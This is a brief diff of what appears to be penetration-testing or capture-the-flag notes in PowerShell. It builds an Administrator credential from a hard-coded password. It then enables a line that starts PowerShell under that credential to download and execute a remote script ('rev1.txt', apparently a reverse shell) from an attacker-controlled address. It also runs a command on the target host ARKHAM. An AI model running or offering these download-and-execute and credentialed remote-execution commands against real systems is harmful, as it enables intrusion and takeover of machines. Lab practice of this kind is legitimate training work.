@@ -153,8 +153,8 @@ $pass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('Administrator',$pass)
 OR
 $cred = New-Object System.Management.Automation.PSCredential('Computername\\Administrator',$pass)
-##### following line does not work
-#####start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.73/rev1.txt')" -credential $cred
+##### following line workds on older systems
+start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.73/rev1.txt')" -credential $cred
 # run hostname
 Invoke-Command -Computer ARKHAM -Credential $cred -ScriptBlock { whoami }
 ### hostname is very sensitive
